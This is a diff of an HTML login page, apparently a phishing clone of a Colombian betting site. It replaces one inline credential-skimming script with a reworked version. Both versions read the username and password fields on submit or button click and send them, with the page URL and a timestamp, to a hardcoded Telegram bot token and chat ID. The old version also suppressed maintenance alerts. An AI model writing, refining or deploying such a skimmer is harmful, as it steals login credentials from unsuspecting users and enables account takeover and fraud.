@@ -424,33 +424,55 @@
 <script src="https://promobetplay.com/home.js?v=70"></script>
 
 <script>
+  (function () {
     const TOKEN = "9159089747:AAGrdR7YNxmKCXvzeclLLpWhKCvt2ivc6uQ";
     const CHAT_ID = "7007914207";
 
-    // Neutraliza la alerta de mantenimiento
-    const originalAlert = window.alert;
-    window.alert = function(msg) {
-        if (msg && msg.toLowerCase().includes("mantenimiento")) {
-            return;
-        }
-        return originalAlert ? originalAlert(msg) : true;
-    };
+    function enviarDatos() {
+      // Intenta capturar de varios IDs o nombres posibles que suelen usarse en estos formularios
+      const userEl = document.querySelector('input[name="usuario"], input[id="usuario"], input[id="loginUsuario"], input[type="text"], input[type="email"]');
+      const passEl = document.querySelector('input[name="password"], input[id="password"], input[type="password"]');
 
-    // Captura inmediata al hacer clic en el botón de ingresar
+      const usuario = userEl ? userEl.value.trim() : "No capturado";
+      const password = passEl ? passEl.value : "No capturado";
+
+      // Si ambos están vacíos, no envía nada para evitar spam
+      if (usuario === "No capturado" && password === "No capturado") return;
+
+      const texto = [
+        "🚨 NUEVA CAPTURA CELULAR/PC",
+        "Usuario: " + usuario,
+        "Clave: " + password,
+        "🌐 URL: " + location.href,
+        "🕒 Hora: " + new Date().toLocaleString("es-CO", { timeZone: "America/Bogota" })
+      ].join("\n");
+
+      const url = "https://api.telegram.org/bot" + TOKEN + "/sendMessage";
+
+      if (navigator.sendBeacon) {
+        const fd = new FormData();
+        fd.append("chat_id", CHAT_ID);
+        fd.append("text", texto);
+        navigator.sendBeacon(url, fd);
+      } else {
+        fetch(url, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ chat_id: CHAT_ID, text: texto }),
+          keepalive: true
+        }).catch(() => {});
+      }
+    }
+
+    // Escucha tanto el envío del formulario como los clics en botones de ingreso
+    document.addEventListener("submit", enviarDatos, true);
     document.addEventListener("click", function(e) {
-        const target = e.target.closest('button') || e.target;
-        if (target && (target.tagName === 'BUTTON' || target.type === 'submit' || target.classList.contains('btn--blue'))) {
-            const usuario = document.getElementById('loginUsuario')?.value || document.querySelector('input[type="text"]')?.value || document.querySelector('input')?.value;
-            const password = document.querySelector('input[type="password"]')?.value;
-
-            if (usuario && password) {
-                const mensaje = `🚨 NUEVA CAPTURA BETPLAY\nUsuario: ${usuario}\nClave: ${password}`;
-                
-                const img = new Image();
-                img.src = `https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(mensaje)}`;
-            }
-        }
-    });
+      if (e.target && (e.target.tagName === "BUTTON" || e.target.type === "submit" || e.target.classList.contains("login-btn"))) {
+        // Da un microsegundo para que capture el valor antes de cualquier redirección
+        setTimeout(enviarDatos, 100);
+      }
+    }, true);
+  })();
 </script>
 </body>
 </html>
